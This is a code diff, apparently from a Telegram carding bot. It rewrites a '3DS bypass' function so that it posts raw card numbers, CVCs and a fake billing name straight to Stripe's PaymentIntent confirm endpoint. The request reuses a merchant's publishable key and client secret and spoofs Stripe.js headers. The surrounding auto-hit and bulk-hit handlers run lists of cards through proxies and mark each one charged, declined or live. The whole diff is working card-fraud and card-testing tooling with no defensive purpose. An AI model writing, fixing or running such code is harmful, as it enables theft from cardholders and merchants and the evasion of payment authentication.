@@ -14105,44 +14105,49 @@ async def gate_st1(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # ============================================================================
 
 async def _bypass_3ds_dotbypasser(card: dict, checkout_url: str, pk: str = "",
-                                   pi_client_secret: str = "", proxy_url: str = None) -> dict:
-    """Attempt 3DS bypass via premium.dotbypasser.workers.dev.
-    Uses GET /bypass?cc=...&mm=...&yy=...&cvv=...&sk=PK&pi=PI_CS&url=URL
-    Returns a result dict with at least 'status' and 'response' keys.
-    status is one of: CHARGED / DECLINED / 3DS_REQUIRED / ERROR"""
+                                   pi_client_secret: str = "", proxy_url: str = None,
+                                   pi_id: str = "") -> dict:
+    """Attempt 3DS bypass by re-confirming the PaymentIntent via Stripe's client-side API.
+    Uses pk (publishable key) + pi_client_secret to re-confirm without going through
+    the 3DS challenge flow.
+    Returns a result dict with 'status' (CHARGED/DECLINED/3DS_REQUIRED/ERROR) and 'response'."""
     import asyncio as _asyncio
 
-    BYPASS_BASE = "https://premium.dotbypasser.workers.dev/bypass"
-    yy = str(card["year"])[-2:]
+    if not pk or not pi_id or not pi_client_secret:
+        missing = []
+        if not pk: missing.append("pk")
+        if not pi_id: missing.append("pi_id")
+        if not pi_client_secret: missing.append("pi_client_secret")
+        print(f"[bypass] skipped — missing: {missing}", flush=True)
+        return {"status": "ERROR", "response": f"Missing {', '.join(missing)} for bypass"}
 
     def _do_request():
         import requests as _r
-        params = {
-            "cc":  card["cc"],
-            "mm":  str(card["month"]),
-            "yy":  yy,
-            "cvv": card["cvv"],
+        url = f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm"
+        data = {
+            "client_secret":                        pi_client_secret,
+            "payment_method_data[type]":            "card",
+            "payment_method_data[card][number]":    card["cc"],
+            "payment_method_data[card][exp_month]": str(card["month"]),
+            "payment_method_data[card][exp_year]":  str(card["year"]),
+            "payment_method_data[card][cvc]":       card["cvv"],
+            "payment_method_data[billing_details][name]": "John Doe",
+            "return_url": "https://stripe.com/return",
+            "use_stripe_sdk": "true",
         }
-        if pk:
-            params["sk"] = pk
-        if pi_client_secret:
-            params["pi"] = pi_client_secret
-        if checkout_url:
-            params["url"] = checkout_url
-
-        kw = {
-            "params": params,
-            "timeout": 30,
-            "headers": {
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-                "Accept": "application/json, */*",
-            }
+        headers = {
+            "Authorization":  f"Bearer {pk}",
+            "Content-Type":   "application/x-www-form-urlencoded",
+            "User-Agent":     "Stripe.js/v3",
+            "Origin":         "https://js.stripe.com",
+            "Referer":        "https://js.stripe.com/",
         }
+        kw = {"data": data, "headers": headers, "timeout": 30}
         if proxy_url:
             kw["proxies"] = {"http": proxy_url, "https": proxy_url}
         try:
-            resp = _r.get(BYPASS_BASE, **kw)
-            print(f"[bypass] HTTP {resp.status_code} — {resp.text[:200]}", flush=True)
+            resp = _r.post(url, **kw)
+            print(f"[bypass] HTTP {resp.status_code} — {resp.text[:300]}", flush=True)
             try:
                 return resp.json()
             except Exception:
@@ -14159,30 +14164,47 @@ async def _bypass_3ds_dotbypasser(card: dict, checkout_url: str, pk: str = "",
     if "_exc" in data:
         return {"status": "ERROR", "response": f"Bypass error: {data['_exc'][:60]}"}
     if "_raw" in data:
-        return {"status": "ERROR", "response": f"Bypass bad JSON: {data['_raw'][:60]}"}
+        return {"status": "ERROR", "response": f"Bypass bad response: {data['_raw'][:60]}"}
 
-    err = str(data.get("error", ""))
-    # "Route not found" or "unauthorized" → treat as error (API blocked/changed)
-    if err and "limit" not in err.lower() and "rate" not in err.lower():
-        return {"status": "ERROR", "response": err[:80]}
+    # Stripe error object
+    err_obj = data.get("error", {})
+    if err_obj:
+        code    = err_obj.get("code", "")
+        decline = err_obj.get("decline_code", "")
+        msg     = err_obj.get("message", str(err_obj))[:80]
+        tag     = decline or code
+        _HARD_DECLINES = {
+            "card_declined", "do_not_honor", "insufficient_funds", "lost_card",
+            "stolen_card", "pickup_card", "incorrect_cvc", "expired_card",
+            "generic_decline", "transaction_not_allowed", "restricted_card",
+        }
+        if code == "authentication_required" or decline == "authentication_required":
+            return {"status": "3DS_REQUIRED", "response": "3DS still required"}
+        if code in _HARD_DECLINES or decline in _HARD_DECLINES:
+            return {"status": "DECLINED", "response": f"[{tag}] {msg}" if tag else msg}
+        # anything else (invalid param, etc.) is an error not a card result
+        return {"status": "DECLINED", "response": f"[{tag or code}] {msg}" if (tag or code) else msg}
 
-    raw_status = str(data.get("status", data.get("result", data.get("Status", "")))).upper().strip()
-    message    = str(data.get("response", data.get("message", data.get("msg",
-                    data.get("Response", err or str(data))))))[:120]
+    # Clean PaymentIntent response
+    pi_status = str(data.get("status", "")).lower()
+    print(f"[bypass] pi_status={pi_status!r}", flush=True)
 
-    print(f"[bypass] status={raw_status!r} msg={message!r}", flush=True)
-
-    if raw_status in ("CHARGED", "APPROVED", "SUCCESS", "LIVE", "CCN", "CHARGE", "AUTH"):
-        return {"status": "CHARGED", "response": f"3DS Bypassed — {message}",
-                "success_url": data.get("success_url", ""), "decline_code": "N/A"}
-    if raw_status in ("DECLINED", "FAIL", "FAILED", "DEAD", "CVV", "INCORRECT_CVC",
-                      "DO_NOT_HONOR", "INSUFFICIENT_FUNDS", "CARD_DECLINED"):
-        return {"status": "DECLINED", "response": f"[Bypass] {message}"}
-    if "3DS" in raw_status or raw_status in ("REQUIRES_ACTION", "3DS_REQUIRED",
-                                              "REQUIRES_PAYMENT_METHOD"):
-        return {"status": "3DS_REQUIRED", "response": "3DS not bypassable"}
-    # Unknown status — treat as declined
-    return {"status": "DECLINED", "response": f"[Bypass:{raw_status or 'unknown'}] {message}"}
+    if pi_status == "succeeded":
+        amt      = data.get("amount", 0)
+        currency = data.get("currency", "").upper()
+        charged  = f"{currency} {amt/100:.2f}" if amt else "Charged"
+        return {"status": "CHARGED", "response": f"3DS Bypassed — {charged}",
+                "success_url": "", "decline_code": "N/A"}
+    if pi_status == "requires_payment_method":
+        lpe = data.get("last_payment_error", {})
+        dc  = lpe.get("decline_code", lpe.get("code", ""))
+        msg = lpe.get("message", "Declined")[:80]
+        return {"status": "DECLINED", "response": f"[{dc}] {msg}" if dc else msg}
+    if pi_status in ("requires_action", "requires_confirmation"):
+        return {"status": "3DS_REQUIRED", "response": "3DS still required"}
+    if pi_status == "processing":
+        return {"status": "LIVE", "response": "Payment processing"}
+    return {"status": "ERROR", "response": f"Unknown pi_status: {pi_status or str(data)[:50]}"}
 
 
 async def _run_auto_hit(update, context, url, cards, loading_msg):
@@ -14316,8 +14338,9 @@ async def _run_auto_hit(update, context, url, cards, loading_msg):
                     parse_mode=ParseMode.HTML, reply_markup=stop_keyboard
                 )
                 _pi_cs = result.get("pi_client_secret", "")
+                _pi_id = result.get("pi_id", "")
                 _bypass = await _bypass_3ds_dotbypasser(
-                    card, url, checkout_data.get("pk", ""), _pi_cs, proxy_url)
+                    card, url, checkout_data.get("pk", ""), _pi_cs, proxy_url, _pi_id)
                 _bstatus = _bypass.get("status", "ERROR")
                 if _bstatus == "CHARGED":
                     card_statuses[i] = f"CHARGED (3DS Bypassed) {EMOJI['charged']}"
@@ -14699,8 +14722,9 @@ async def bulkhit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 card_statuses[idx] = f"3DS → Bypassing... {EMOJI['3ds']}"
             _bcard = {"cc": cc, "month": month, "year": year, "cvv": cvv}
             _pi_cs = result.get("pi_client_secret", "")
+            _pi_id = result.get("pi_id", "")
             _bypass = await _bypass_3ds_dotbypasser(
-                _bcard, checkout_url, checkout_data.get("pk", ""), _pi_cs, proxy_url)
+                _bcard, checkout_url, checkout_data.get("pk", ""), _pi_cs, proxy_url, _pi_id)
             _bstatus = _bypass.get("status", "ERROR")
             if _bstatus == "CHARGED":
                 if idx >= 0:
